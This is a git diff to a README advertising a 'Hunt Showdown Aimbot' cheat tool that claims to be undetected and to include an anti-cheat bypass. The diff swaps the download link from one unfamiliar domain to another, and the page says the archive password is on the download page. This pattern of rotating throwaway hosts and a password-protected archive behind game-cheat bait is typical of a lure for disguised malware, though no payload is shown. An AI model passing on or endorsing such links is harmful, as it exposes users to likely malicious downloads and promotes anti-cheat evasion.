@@ -18,7 +18,7 @@ Hunt Showdown Aimbot - undetected cheat tool. Anti-cheat bypass included. Works 
 
 ## Download
 
-[![Download v2.4.0](https://img.shields.io/badge/Download_v2.4.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/huntaimbot2)
+[![Download v2.4.0](https://img.shields.io/badge/Download_v2.4.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/huntaimbot2)
 
 > The archive password is shown on the download page.
 
